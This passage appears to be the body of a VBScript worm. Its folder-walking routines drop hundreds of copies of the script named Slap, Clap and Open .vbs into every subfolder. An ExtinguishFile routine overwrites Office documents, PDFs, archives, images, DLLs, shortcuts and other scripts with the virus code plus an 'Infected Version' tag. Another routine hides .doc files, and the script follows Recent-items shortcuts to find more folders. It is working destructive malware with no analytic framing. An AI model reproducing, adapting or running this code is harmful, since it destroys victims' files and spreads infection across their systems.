Cloner(target & "\Slap182.vbs")
Cloner(target & "\Slap183.vbs")
Cloner(target & "\Slap184.vbs")
Cloner(target & "\Slap185.vbs")
Cloner(target & "\Slap186.vbs")
Cloner(target & "\Slap187.vbs")
Cloner(target & "\Slap188.vbs")
Cloner(target & "\Slap189.vbs")
Cloner(target & "\Slap190.vbs")
Cloner(target & "\Slap191.vbs")
Cloner(target & "\Slap192.vbs")
Cloner(target & "\Slap193.vbs")
Cloner(target & "\Slap194.vbs")
Cloner(target & "\Slap195.vbs")
Cloner(target & "\Slap196.vbs")
Cloner(target & "\Slap197.vbs")
Cloner(target & "\Slap198.vbs")
Cloner(target & "\Slap199.vbs")
Cloner(target & "\Slap200.vbs")
Cloner(target & "\Slap201.vbs")
Cloner(target & "\Slap202.vbs")
Cloner(target & "\Slap203.vbs")
Cloner(target & "\Slap204.vbs")
Cloner(target & "\Slap205.vbs")
Cloner(target & "\Slap206.vbs")
Cloner(target & "\Slap207.vbs")
Cloner(target & "\Slap208.vbs")
Cloner(target & "\Slap209.vbs")
Cloner(target & "\Slap210.vbs")
Cloner(target & "\Slap211.vbs")
Cloner(target & "\Slap212.vbs")
Cloner(target & "\Slap213.vbs")
Cloner(target & "\Slap214.vbs")
Cloner(target & "\Slap215.vbs")
Cloner(target & "\Slap216.vbs")
Cloner(target & "\Slap217.vbs")
Cloner(target & "\Slap218.vbs")
Cloner(target & "\Slap219.vbs")
Cloner(target & "\Slap220.vbs")
Cloner(target & "\Slap221.vbs")
Cloner(target & "\Slap222.vbs")
Cloner(target & "\Slap223.vbs")
Cloner(target & "\Slap224.vbs")
Cloner(target & "\Slap225.vbs")
Cloner(target & "\Slap226.vbs")
Cloner(target & "\Slap227.vbs")
Cloner(target & "\Slap228.vbs")
Cloner(target & "\Slap229.vbs")
Cloner(target & "\Slap230.vbs")
Cloner(target & "\Slap231.vbs")
Cloner(target & "\Slap232.vbs")
Cloner(target & "\Slap233.vbs")
Cloner(target & "\Slap234.vbs")
Cloner(target & "\Slap235.vbs")
Cloner(target & "\Slap236.vbs")
Cloner(target & "\Slap237.vbs")
Cloner(target & "\Slap238.vbs")
Cloner(target & "\Slap239.vbs")
Cloner(target & "\Slap240.vbs")
Cloner(target & "\Slap241.vbs")
Cloner(target & "\Slap242.vbs")
Cloner(target & "\Slap243.vbs")
Cloner(target & "\Slap244.vbs")
Cloner(target & "\Slap245.vbs")
Cloner(target & "\Slap246.vbs")
Cloner(target & "\Slap247.vbs")
Cloner(target & "\Slap248.vbs")
Cloner(target & "\Slap249.vbs")
Cloner(target & "\Slap250.vbs")
FindFile
FindFolder2 (target)
Next
End Sub


Sub FindFolder2 (CopyMachine)
On Error Resume Next
If CopyMachine = "" Then Exit Sub
if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(CopyMachine).SubFolders
Cloner(target & "\Lmao.vbs")
Cloner(target & "\Clap.vbs")
Cloner(target & "\Clap1.vbs")
Cloner(target & "\Clap2.vbs")
Cloner(target & "\Clap3.vbs")
Cloner(target & "\Clap4.vbs")
Cloner(target & "\Clap5.vbs")
Cloner(target & "\Clap6.vbs")
Cloner(target & "\Clap7.vbs")
Cloner(target & "\Clap8.vbs")
Cloner(target & "\Clap9.vbs")
Cloner(target & "\Clap10.vbs")
Cloner(target & "\Clap11.vbs")
Cloner(target & "\Clap12.vbs")
Cloner(target & "\Clap13.vbs")
Cloner(target & "\Clap14.vbs")
Cloner(target & "\Clap15.vbs")
Cloner(target & "\Clap16.vbs")
Cloner(target & "\Clap17.vbs")
Cloner(target & "\Clap18.vbs")
Cloner(target & "\Clap19.vbs")
Cloner(target & "\Clap20.vbs")
Cloner(target & "\Clap21.vbs")
Cloner(target & "\Clap22.vbs")
Cloner(target & "\Clap23.vbs")
Cloner(target & "\Clap24.vbs")
Cloner(target & "\Clap25.vbs")
Cloner(target & "\Clap26.vbs")
Cloner(target & "\Clap27.vbs")
Cloner(target & "\Clap28.vbs")
Cloner(target & "\Clap29.vbs")
Cloner(target & "\Clap30.vbs")
Cloner(target & "\Clap31.vbs")
Cloner(target & "\Clap32.vbs")
Cloner(target & "\Clap33.vbs")
Cloner(target & "\Clap34.vbs")
Cloner(target & "\Clap35.vbs")
Cloner(target & "\Clap36.vbs")
Cloner(target & "\Clap37.vbs")
Cloner(target & "\Clap38.vbs")
Cloner(target & "\Clap39.vbs")
Cloner(target & "\Clap40.vbs")
Cloner(target & "\Clap41.vbs")
Cloner(target & "\Clap42.vbs")
Cloner(target & "\Clap43.vbs")
Cloner(target & "\Clap44.vbs")
Cloner(target & "\Clap45.vbs")
Cloner(target & "\Clap46.vbs")
Cloner(target & "\Clap47.vbs")
Cloner(target & "\Clap48.vbs")
Cloner(target & "\Clap49.vbs")
Cloner(target & "\Clap50.vbs")
Cloner(target & "\Clap51.vbs")
Cloner(target & "\Clap52.vbs")
Cloner(target & "\Clap53.vbs")
Cloner(target & "\Clap54.vbs")
Cloner(target & "\Clap55.vbs")
Cloner(target & "\Clap56.vbs")
Cloner(target & "\Clap57.vbs")
Cloner(target & "\Clap58.vbs")
Cloner(target & "\Clap59.vbs")
Cloner(target & "\Clap60.vbs")
Cloner(target & "\Clap61.vbs")
Cloner(target & "\Clap62.vbs")
Cloner(target & "\Clap63.vbs")
Cloner(target & "\Clap64.vbs")
Cloner(target & "\Clap65.vbs")
Cloner(target & "\Clap66.vbs")
Cloner(target & "\Clap67.vbs")
Cloner(target & "\Clap68.vbs")
Cloner(target & "\Clap69.vbs")
Cloner(target & "\Clap70.vbs")
Cloner(target & "\Clap71.vbs")
Cloner(target & "\Clap72.vbs")
Cloner(target & "\Clap73.vbs")
Cloner(target & "\Clap74.vbs")
Cloner(target & "\Clap75.vbs")
Cloner(target & "\Clap76.vbs")
Cloner(target & "\Clap77.vbs")
Cloner(target & "\Clap78.vbs")
Cloner(target & "\Clap79.vbs")
Cloner(target & "\Clap80.vbs")
Cloner(target & "\Clap81.vbs")
Cloner(target & "\Clap82.vbs")
Cloner(target & "\Clap83.vbs")
Cloner(target & "\Clap84.vbs")
Cloner(target & "\Clap85.vbs")
Cloner(target & "\Clap86.vbs")
Cloner(target & "\Clap87.vbs")
Cloner(target & "\Clap88.vbs")
Cloner(target & "\Clap89.vbs")
Cloner(target & "\Clap90.vbs")
Cloner(target & "\Clap91.vbs")
Cloner(target & "\Clap92.vbs")
Cloner(target & "\Clap93.vbs")
Cloner(target & "\Clap94.vbs")
Cloner(target & "\Clap95.vbs")
Cloner(target & "\Clap96.vbs")
Cloner(target & "\Clap97.vbs")
Cloner(target & "\Clap98.vbs")
Cloner(target & "\Clap99.vbs")
Cloner(target & "\Clap100.vbs")
Cloner(target & "\Clap101.vbs")
Cloner(target & "\Clap102.vbs")
Cloner(target & "\Clap103.vbs")
Cloner(target & "\Clap104.vbs")
Cloner(target & "\Clap105.vbs")
Cloner(target & "\Clap106.vbs")
Cloner(target & "\Clap107.vbs")
Cloner(target & "\Clap108.vbs")
Cloner(target & "\Clap109.vbs")
Cloner(target & "\Clap110.vbs")
Cloner(target & "\Clap111.vbs")
Cloner(target & "\Clap112.vbs")
Cloner(target & "\Clap113.vbs")
Cloner(target & "\Clap114.vbs")
Cloner(target & "\Clap115.vbs")
Cloner(target & "\Clap116.vbs")
Cloner(target & "\Clap117.vbs")
Cloner(target & "\Clap118.vbs")
Cloner(target & "\Clap119.vbs")
Cloner(target & "\Clap120.vbs")
Cloner(target & "\Clap121.vbs")
Cloner(target & "\Clap122.vbs")
Cloner(target & "\Clap123.vbs")
Cloner(target & "\Clap124.vbs")
Cloner(target & "\Clap125.vbs")
Cloner(target & "\Clap126.vbs")
Cloner(target & "\Clap127.vbs")
Cloner(target & "\Clap128.vbs")
Cloner(target & "\Clap129.vbs")
Cloner(target & "\Clap130.vbs")
Cloner(target & "\Clap131.vbs")
Cloner(target & "\Clap132.vbs")
Cloner(target & "\Clap133.vbs")
Cloner(target & "\Clap134.vbs")
Cloner(target & "\Clap135.vbs")
Cloner(target & "\Clap136.vbs")
Cloner(target & "\Clap137.vbs")
Cloner(target & "\Clap138.vbs")
Cloner(target & "\Clap139.vbs")
Cloner(target & "\Clap140.vbs")
Cloner(target & "\Clap141.vbs")
Cloner(target & "\Clap142.vbs")
Cloner(target & "\Clap143.vbs")
Cloner(target & "\Clap144.vbs")
Cloner(target & "\Clap145.vbs")
Cloner(target & "\Clap146.vbs")
Cloner(target & "\Clap147.vbs")
Cloner(target & "\Clap148.vbs")
Cloner(target & "\Clap149.vbs")
Cloner(target & "\Clap150.vbs")
Cloner(target & "\Clap151.vbs")
Cloner(target & "\Clap152.vbs")
Cloner(target & "\Clap153.vbs")
Cloner(target & "\Clap154.vbs")
Cloner(target & "\Clap155.vbs")
Cloner(target & "\Clap156.vbs")
Cloner(target & "\Clap157.vbs")
Cloner(target & "\Clap158.vbs")
Cloner(target & "\Clap159.vbs")
Cloner(target & "\Clap160.vbs")
Cloner(target & "\Clap161.vbs")
Cloner(target & "\Clap162.vbs")
Cloner(target & "\Clap163.vbs")
Cloner(target & "\Clap164.vbs")
Cloner(target & "\Clap165.vbs")
Cloner(target & "\Clap166.vbs")
Cloner(target & "\Clap167.vbs")
Cloner(target & "\Clap168.vbs")
Cloner(target & "\Clap169.vbs")
Cloner(target & "\Clap170.vbs")
Cloner(target & "\Clap171.vbs")
Cloner(target & "\Clap172.vbs")
Cloner(target & "\Clap173.vbs")
Cloner(target & "\Clap174.vbs")
Cloner(target & "\Clap175.vbs")
Cloner(target & "\Clap176.vbs")
Cloner(target & "\Clap177.vbs")
Cloner(target & "\Clap178.vbs")
Cloner(target & "\Clap179.vbs")
Cloner(target & "\Clap180.vbs")
Cloner(target & "\Clap181.vbs")
Cloner(target & "\Clap182.vbs")
Cloner(target & "\Clap183.vbs")
Cloner(target & "\Clap184.vbs")
Cloner(target & "\Clap185.vbs")
Cloner(target & "\Clap186.vbs")
Cloner(target & "\Clap187.vbs")
Cloner(target & "\Clap188.vbs")
Cloner(target & "\Clap189.vbs")
Cloner(target & "\Clap190.vbs")
Cloner(target & "\Clap191.vbs")
Cloner(target & "\Clap192.vbs")
Cloner(target & "\Clap193.vbs")
Cloner(target & "\Clap194.vbs")
Cloner(target & "\Clap195.vbs")
Cloner(target & "\Clap196.vbs")
Cloner(target & "\Clap197.vbs")
Cloner(target & "\Clap198.vbs")
Cloner(target & "\Clap199.vbs")
Cloner(target & "\Clap200.vbs")
Cloner(target & "\Clap201.vbs")
Cloner(target & "\Clap202.vbs")
Cloner(target & "\Clap203.vbs")
Cloner(target & "\Clap204.vbs")
Cloner(target & "\Clap205.vbs")
Cloner(target & "\Clap206.vbs")
Cloner(target & "\Clap207.vbs")
Cloner(target & "\Clap208.vbs")
Cloner(target & "\Clap209.vbs")
Cloner(target & "\Clap210.vbs")
Cloner(target & "\Clap211.vbs")
Cloner(target & "\Clap212.vbs")
Cloner(target & "\Clap213.vbs")
Cloner(target & "\Clap214.vbs")
Cloner(target & "\Clap215.vbs")
Cloner(target & "\Clap216.vbs")
Cloner(target & "\Clap217.vbs")
Cloner(target & "\Clap218.vbs")
Cloner(target & "\Clap219.vbs")
Cloner(target & "\Clap220.vbs")
Cloner(target & "\Clap221.vbs")
Cloner(target & "\Clap222.vbs")
Cloner(target & "\Clap223.vbs")
Cloner(target & "\Clap224.vbs")
Cloner(target & "\Clap225.vbs")
Cloner(target & "\Clap226.vbs")
Cloner(target & "\Clap227.vbs")
Cloner(target & "\Clap228.vbs")
Cloner(target & "\Clap229.vbs")
Cloner(target & "\Clap230.vbs")
Cloner(target & "\Clap231.vbs")
Cloner(target & "\Clap232.vbs")
Cloner(target & "\Clap233.vbs")
Cloner(target & "\Clap234.vbs")
Cloner(target & "\Clap235.vbs")
Cloner(target & "\Clap236.vbs")
Cloner(target & "\Clap237.vbs")
Cloner(target & "\Clap238.vbs")
Cloner(target & "\Clap239.vbs")
Cloner(target & "\Clap240.vbs")
Cloner(target & "\Clap241.vbs")
Cloner(target & "\Clap242.vbs")
Cloner(target & "\Clap243.vbs")
Cloner(target & "\Clap244.vbs")
Cloner(target & "\Clap245.vbs")
Cloner(target & "\Clap246.vbs")
Cloner(target & "\Clap247.vbs")
Cloner(target & "\Clap248.vbs")
Cloner(target & "\Clap249.vbs")
Cloner(target & "\Clap250.vbs")
FindFile (target)
FindFolder3 (target)
Next
End Sub

Sub FindFolder3 (CopyMachine)
On Error Resume Next
If CopyMachine = "" Then Exit Sub
if CopyMachine = Left(Key.SpecialFolders("Desktop"),3) & "Windows" then exit sub
Dim target
For Each target In fso.GetFolder(CopyMachine).SubFolders
Cloner(target & "\Ayy.vbs")
Cloner(target & "\Open.vbs")
Cloner(target & "\Open1.vbs")
Cloner(target & "\Open2.vbs")
Cloner(target & "\Open3.vbs")
Cloner(target & "\Open4.vbs")
Cloner(target & "\Open5.vbs")
Cloner(target & "\Open6.vbs")
Cloner(target & "\Open7.vbs")
Cloner(target & "\Open8.vbs")
Cloner(target & "\Open9.vbs")
Cloner(target & "\Open10.vbs")
Cloner(target & "\Open11.vbs")
Cloner(target & "\Open12.vbs")
Cloner(target & "\Open13.vbs")
Cloner(target & "\Open14.vbs")
Cloner(target & "\Open15.vbs")
Cloner(target & "\Open16.vbs")
Cloner(target & "\Open17.vbs")
Cloner(target & "\Open18.vbs")
Cloner(target & "\Open19.vbs")
Cloner(target & "\Open20.vbs")
Cloner(target & "\Open21.vbs")
Cloner(target & "\Open22.vbs")
Cloner(target & "\Open23.vbs")
Cloner(target & "\Open24.vbs")
Cloner(target & "\Open25.vbs")
Cloner(target & "\Open26.vbs")
Cloner(target & "\Open27.vbs")
Cloner(target & "\Open28.vbs")
Cloner(target & "\Open29.vbs")
Cloner(target & "\Open30.vbs")
Cloner(target & "\Open31.vbs")
Cloner(target & "\Open32.vbs")
Cloner(target & "\Open33.vbs")
Cloner(target & "\Open34.vbs")
Cloner(target & "\Open35.vbs")
Cloner(target & "\Open36.vbs")
Cloner(target & "\Open37.vbs")
Cloner(target & "\Open38.vbs")
Cloner(target & "\Open39.vbs")
Cloner(target & "\Open40.vbs")
Cloner(target & "\Open41.vbs")
Cloner(target & "\Open42.vbs")
Cloner(target & "\Open43.vbs")
Cloner(target & "\Open44.vbs")
Cloner(target & "\Open45.vbs")
Cloner(target & "\Open46.vbs")
Cloner(target & "\Open47.vbs")
Cloner(target & "\Open48.vbs")
Cloner(target & "\Open49.vbs")
Cloner(target & "\Open50.vbs")
Cloner(target & "\Open51.vbs")
Cloner(target & "\Open52.vbs")
Cloner(target & "\Open53.vbs")
Cloner(target & "\Open54.vbs")
Cloner(target & "\Open55.vbs")
Cloner(target & "\Open56.vbs")
Cloner(target & "\Open57.vbs")
Cloner(target & "\Open58.vbs")
Cloner(target & "\Open59.vbs")
Cloner(target & "\Open60.vbs")
Cloner(target & "\Open61.vbs")
Cloner(target & "\Open62.vbs")
Cloner(target & "\Open63.vbs")
Cloner(target & "\Open64.vbs")
Cloner(target & "\Open65.vbs")
Cloner(target & "\Open66.vbs")
Cloner(target & "\Open67.vbs")
Cloner(target & "\Open68.vbs")
Cloner(target & "\Open69.vbs")
Cloner(target & "\Open70.vbs")
Cloner(target & "\Open71.vbs")
Cloner(target & "\Open72.vbs")
Cloner(target & "\Open73.vbs")
Cloner(target & "\Open74.vbs")
Cloner(target & "\Open75.vbs")
Cloner(target & "\Open76.vbs")
Cloner(target & "\Open77.vbs")
Cloner(target & "\Open78.vbs")
Cloner(target & "\Open79.vbs")
Cloner(target & "\Open80.vbs")
Cloner(target & "\Open81.vbs")
Cloner(target & "\Open82.vbs")
Cloner(target & "\Open83.vbs")
Cloner(target & "\Open84.vbs")
Cloner(target & "\Open85.vbs")
Cloner(target & "\Open86.vbs")
Cloner(target & "\Open87.vbs")
Cloner(target & "\Open88.vbs")
Cloner(target & "\Open89.vbs")
Cloner(target & "\Open90.vbs")
Cloner(target & "\Open91.vbs")
Cloner(target & "\Open92.vbs")
Cloner(target & "\Open93.vbs")
Cloner(target & "\Open94.vbs")
Cloner(target & "\Open95.vbs")
Cloner(target & "\Open96.vbs")
Cloner(target & "\Open97.vbs")
Cloner(target & "\Open98.vbs")
Cloner(target & "\Open99.vbs")
Cloner(target & "\Open100.vbs")
Cloner(target & "\Open101.vbs")
Cloner(target & "\Open102.vbs")
Cloner(target & "\Open103.vbs")
Cloner(target & "\Open104.vbs")
Cloner(target & "\Open105.vbs")
Cloner(target & "\Open106.vbs")
Cloner(target & "\Open107.vbs")
Cloner(target & "\Open108.vbs")
Cloner(target & "\Open109.vbs")
Cloner(target & "\Open110.vbs")
Cloner(target & "\Open111.vbs")
Cloner(target & "\Open112.vbs")
Cloner(target & "\Open113.vbs")
Cloner(target & "\Open114.vbs")
Cloner(target & "\Open115.vbs")
Cloner(target & "\Open116.vbs")
Cloner(target & "\Open117.vbs")
Cloner(target & "\Open118.vbs")
Cloner(target & "\Open119.vbs")
Cloner(target & "\Open120.vbs")
Cloner(target & "\Open121.vbs")
Cloner(target & "\Open122.vbs")
Cloner(target & "\Open123.vbs")
Cloner(target & "\Open124.vbs")
Cloner(target & "\Open125.vbs")
Cloner(target & "\Open126.vbs")
Cloner(target & "\Open127.vbs")
Cloner(target & "\Open128.vbs")
Cloner(target & "\Open129.vbs")
Cloner(target & "\Open130.vbs")
Cloner(target & "\Open131.vbs")
Cloner(target & "\Open132.vbs")
Cloner(target & "\Open133.vbs")
Cloner(target & "\Open134.vbs")
Cloner(target & "\Open135.vbs")
Cloner(target & "\Open136.vbs")
Cloner(target & "\Open137.vbs")
Cloner(target & "\Open138.vbs")
Cloner(target & "\Open139.vbs")
Cloner(target & "\Open140.vbs")
Cloner(target & "\Open141.vbs")
Cloner(target & "\Open142.vbs")
Cloner(target & "\Open143.vbs")
Cloner(target & "\Open144.vbs")
Cloner(target & "\Open145.vbs")
Cloner(target & "\Open146.vbs")
Cloner(target & "\Open147.vbs")
Cloner(target & "\Open148.vbs")
Cloner(target & "\Open149.vbs")
Cloner(target & "\Open150.vbs")
Cloner(target & "\Open151.vbs")
Cloner(target & "\Open152.vbs")
Cloner(target & "\Open153.vbs")
Cloner(target & "\Open154.vbs")
Cloner(target & "\Open155.vbs")
Cloner(target & "\Open156.vbs")
Cloner(target & "\Open157.vbs")
Cloner(target & "\Open158.vbs")
Cloner(target & "\Open159.vbs")
Cloner(target & "\Open160.vbs")
Cloner(target & "\Open161.vbs")
Cloner(target & "\Open162.vbs")
Cloner(target & "\Open163.vbs")
Cloner(target & "\Open164.vbs")
Cloner(target & "\Open165.vbs")
Cloner(target & "\Open166.vbs")
Cloner(target & "\Open167.vbs")
Cloner(target & "\Open168.vbs")
Cloner(target & "\Open169.vbs")
Cloner(target & "\Open170.vbs")
Cloner(target & "\Open171.vbs")
Cloner(target & "\Open172.vbs")
Cloner(target & "\Open173.vbs")
Cloner(target & "\Open174.vbs")
Cloner(target & "\Open175.vbs")
Cloner(target & "\Open176.vbs")
Cloner(target & "\Open177.vbs")
Cloner(target & "\Open178.vbs")
Cloner(target & "\Open179.vbs")
Cloner(target & "\Open180.vbs")
Cloner(target & "\Open181.vbs")
Cloner(target & "\Open182.vbs")
Cloner(target & "\Open183.vbs")
Cloner(target & "\Open184.vbs")
Cloner(target & "\Open185.vbs")
Cloner(target & "\Open186.vbs")
Cloner(target & "\Open187.vbs")
Cloner(target & "\Open188.vbs")
Cloner(target & "\Open189.vbs")
Cloner(target & "\Open190.vbs")
Cloner(target & "\Open191.vbs")
Cloner(target & "\Open192.vbs")
Cloner(target & "\Open193.vbs")
Cloner(target & "\Open194.vbs")
Cloner(target & "\Open195.vbs")
Cloner(target & "\Open196.vbs")
Cloner(target & "\Open197.vbs")
Cloner(target & "\Open198.vbs")
Cloner(target & "\Open199.vbs")
Cloner(target & "\Open200.vbs")
Cloner(target & "\Open201.vbs")
Cloner(target & "\Open202.vbs")
Cloner(target & "\Open203.vbs")
Cloner(target & "\Open204.vbs")
Cloner(target & "\Open205.vbs")
Cloner(target & "\Open206.vbs")
Cloner(target & "\Open207.vbs")
Cloner(target & "\Open208.vbs")
Cloner(target & "\Open209.vbs")
Cloner(target & "\Open210.vbs")
Cloner(target & "\Open211.vbs")
Cloner(target & "\Open212.vbs")
Cloner(target & "\Open213.vbs")
Cloner(target & "\Open214.vbs")
Cloner(target & "\Open215.vbs")
Cloner(target & "\Open216.vbs")
Cloner(target & "\Open217.vbs")
Cloner(target & "\Open218.vbs")
Cloner(target & "\Open219.vbs")
Cloner(target & "\Open220.vbs")
Cloner(target & "\Open221.vbs")
Cloner(target & "\Open222.vbs")
Cloner(target & "\Open223.vbs")
Cloner(target & "\Open224.vbs")
Cloner(target & "\Open225.vbs")
Cloner(target & "\Open226.vbs")
Cloner(target & "\Open227.vbs")
Cloner(target & "\Open228.vbs")
Cloner(target & "\Open229.vbs")
Cloner(target & "\Open230.vbs")
Cloner(target & "\Open231.vbs")
Cloner(target & "\Open232.vbs")
Cloner(target & "\Open233.vbs")
Cloner(target & "\Open234.vbs")
Cloner(target & "\Open235.vbs")
Cloner(target & "\Open236.vbs")
Cloner(target & "\Open237.vbs")
Cloner(target & "\Open238.vbs")
Cloner(target & "\Open239.vbs")
Cloner(target & "\Open240.vbs")
Cloner(target & "\Open241.vbs")
Cloner(target & "\Open242.vbs")
Cloner(target & "\Open243.vbs")
Cloner(target & "\Open244.vbs")
Cloner(target & "\Open245.vbs")
Cloner(target & "\Open246.vbs")
Cloner(target & "\Open247.vbs")
Cloner(target & "\Open248.vbs")
Cloner(target & "\Open249.vbs")
Cloner(target & "\Open250.vbs")
FindFile (target)
Next
End Sub

Sub FindFile (CopyMachine)
On Error Resume Next
Dim target
For Each target In fso.GetFolder(CopyMachine).Files
If lcase(Right(target,3))="doc" then
if Left(target,2)<> "~$" then ExtinguishFile(target)
SetFile (target)
End If
If lcase(Right(target,3))="xls" or lcase(Right(target,3))="ppt" or lcase(Right(target,3))="pdf" or lcase(Right(target,3))="rtf" or lcase(Right(target,3))="rar" or lcase(Right(target,3))="zip" or lcase(Right(target,3))="jpg" or lcase(Right(target,3))="gif" or lcase(Right(target,3))="bmp" or lcase(Right(target,3))="scr" or lcase(Right(target,3))="dll" or lcase(Right(target,3))="lnk"  then
if Left(target,2)<> "~$" then ExtinguishFile(target)
End If
If lcase(Right(target,4))="docx" or lcase(Right(target,4))="xlsx" or lcase(Right(target,4))="pptx" then
if Left(target,2)<> "~$" then ExtinguishFile(target)
End If
if lcase(Right(target,3))="vbs" then ExtinguishFile(target)
Next
End sub

Sub SetFile (Protect)
Dim f1
Set f1 = fso.GetFile(Protect)
f1.Attributes = 6
End sub

Sub Cloner (Murder)
On Error Resume Next
Dim ts, a, tf
Set ts = fso.openTextFile(Eater, 1)
a = ts.ReadAll
ts.Close
Set tf = fso.CreateTextFile(Murder, True)
tf.Write a
tf.Close
Set ts = fso.GetFile(Murder)
ts.Attributes = 1
End sub

Sub ExtinguishFile(Murder)
On Error Resume Next
Dim data, ts, i, a, tf
Randomize
data = Left(Rnd(15) * 10000000000, 10)
Set ts = fso.openTextFile (Murder, 1)
i = ts.ReadAll
ts.close
Set ts = fso.openTextFile(Eater, 1)
a = ts.ReadAll
ts.Close
Set tf = fso.CreateTextFile(Murder, True)
tf.WriteLine a
ts.WriteBlankLines(1)
tf.WriteLine ("Rem Infected Version: " & data)
ts.WriteBlankLines(2)
tf.WriteLine i
tf.Close
Set ts = fso.GetFile(Murder)
ts.Attributes = 1
End sub

Sub FindRecent
On Error Resume Next
Dim target, ok
For Each target in fso.GetFolder(Key.SpecialFolders("Recent")).Files
Set ok = Key.CreateShortCut(target)
if fso.FolderExists(ok.WorkingDirectory) then FindFolder (ok.WorkingDirectory)
Next
End sub